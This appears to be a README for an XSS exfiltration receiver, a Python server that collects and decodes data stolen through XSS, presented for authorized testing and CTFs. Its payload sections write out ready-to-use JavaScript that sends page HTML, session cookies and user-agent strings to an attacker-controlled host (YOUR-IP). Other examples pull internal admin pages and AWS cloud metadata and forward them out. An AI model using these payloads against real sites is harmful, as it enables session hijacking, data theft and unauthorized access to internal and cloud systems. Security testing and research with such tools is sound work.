# 🕵️ XSS Exfiltration Receiver (Lite Edition)

A lightweight, self-contained HTTP receiver for capturing, decoding, validating, and storing data exfiltrated via XSS payloads.

Designed for **authorized security testing, CTFs, and research labs**, this tool accepts exfiltrated data over HTTP GET or POST, 
recursively decodes URL/Base64 payloads, detects HTML content, and persists artifacts for offline analysis.

---

## 📦 Repository Layout

```

xss_receiver/
├── receiver__.py        # Python 3 receiver server (GET/POST + decoder)
├── decoded_html/        # Saved decoded payloads (HTML / raw)
└── README.md            # This file

````

---

## 🚀 Quick Start

### Start the Receiver

```bash
python3 receiver__.py --port 8080 --show
````

### Common Flags

| Flag                     | Description                           |
| ------------------------ | ------------------------------------- |
| `--port`                 | Port to listen on (default: 80)       |
| `--show`                 | Print decoded HTML payloads to stdout |
| `--show-all`             | Print *all* decoded payloads          |
| `--json-log`             | Emit JSONL logs to disk               |
| `--security-level`       | `low`, `medium`, or `high` validation |
| `--allow-ip`             | Restrict access to specific IPs       |
| `--api-key`              | Require `X-API-Key` header            |
| `--rate-limit`           | Max requests per window               |
| `--ssl-cert / --ssl-key` | Enable TLS                            |

---

## 📡 Payload Usage

### GET-based Exfiltration

```html
<img src="http://YOUR-IP:8080/?data=BASE64_PAYLOAD">
```

### POST-based Exfiltration

```js
fetch("http://YOUR-IP:8080/", {
  method: "POST",
  body: "data=" + btoa(document.documentElement.outerHTML)
});
```

---

## 🔁 Decoding Capabilities

* Recursive decoding (URL → Base64 → URL …)
* Default depth: **5 layers**
* Safe guards against memory expansion attacks
* Automatic UTF-8 normalization

---

## 🧠 HTML Detection & Persistence

* HTML auto-detection via `<html>`, `<body>`, or `<!doctype>`
* Decoded HTML is saved to `decoded_html/`
* Timestamped, sanitized filenames
* Permissions hardened (`750` directory, `640` files)

---

## 🗂️ Output Artifacts

| Output                   | Description                        |
| ------------------------ | ---------------------------------- |
| `decoded_html/*.html`    | Decoded HTML payloads              |
| `decoded_html/*.txt`     | Raw captured payloads              |
| `decoded_html/log.jsonl` | Optional structured logs           |
| stdout                   | Decoder layers, previews, warnings |

---

## 🧪 Example Payloads

### DOM Exfiltration

```js
fetch("http://YOUR-IP:8080/?data=" + btoa(document.documentElement.outerHTML));
```

### Cookie Theft

```js
fetch("http://YOUR-IP:8080/?data=" + btoa(document.cookie));
```

### Cookie + User-Agent

```js
fetch("http://YOUR-IP:8080/?data=" +
  btoa(document.cookie + " | " + navigator.userAgent));
```

### Internal Resource Access (SSRF-style)

```js
fetch("http://127.0.0.1/admin")
  .then(r => r.text())
  .then(t => fetch("http://YOUR-IP:8080/?data=" + btoa(t)));
```

### Cloud Metadata Probe (AWS-style)

```js
fetch("http://169.254.169.254/latest/meta-data/hostname")
  .then(r => r.text())
  .then(d => fetch("http://YOUR-IP:8080/?data=" + btoa(d)));
```

---

## 📊 Stats Endpoint

If enabled (default):

```bash
curl http://YOUR-IP:8080/stats
```

Returns JSON including:

* Total requests
* Unique IPs
* Saved HTML count
* Rate limiter state
* Uptime

---

## 🔐 Security Model

This tool includes **defensive guardrails**:

* Optional IP allowlists
* API key authentication
* Rate limiting
* Payload size caps
* Content inspection (configurable)
* File system sandboxing
* TLS support

### Security Levels

| Level    | Behavior                               |
| -------- | -------------------------------------- |
| `low`    | Capture everything                     |
| `medium` | Warn on suspicious content             |
| `high`   | Block private IPs & dangerous patterns |

---

## ⚠️ Legal & Ethical Notice

This software is intended **only for environments you own or are explicitly authorized to test**.

Unauthorized use against third-party systems may be illegal.
You are responsible for complying with all applicable laws.

---

## 🛠 Future Ideas (Optional)

* IP reputation scoring
* Webhook + SIEM integration
* Replay UI for captured DOMs
* Payload fingerprinting
* Signed capture artifacts

---

Built with ❤️ for offensive and defensive security research.

```
